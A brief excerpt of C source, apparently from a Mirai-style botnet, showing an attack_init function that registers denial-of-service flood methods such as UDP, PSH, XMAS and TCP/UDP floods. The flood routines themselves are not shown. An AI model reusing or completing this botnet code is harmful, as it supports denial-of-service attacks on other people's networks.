...
BOOL attack_init(void)
{
    ...
    add_attack(ATK_VEC_PSH, (ATTACK_FUNC)attack_method_psh);
    add_attack(ATK_VEC_UDPHEX, (ATTACK_FUNC)attack_method_udphex);
    add_attack(ATK_VEC_UDPSTR, (ATTACK_FUNC)attack_method_udpstr);
    add_attack(ATK_VEC_UDPPUSH, (ATTACK_FUNC)attack_udp_push);
    add_attack(ATK_VEC_UDPRAND, (ATTACK_FUNC)attack_method_udprand);
    add_attack(ATK_VEC_XMAS, (ATTACK_FUNC)attack_method_xmas);
    add_attack(ATK_VEC_TCPUDP, (ATTACK_FUNC)attack_method_tcpudp);
    return TRUE;
}
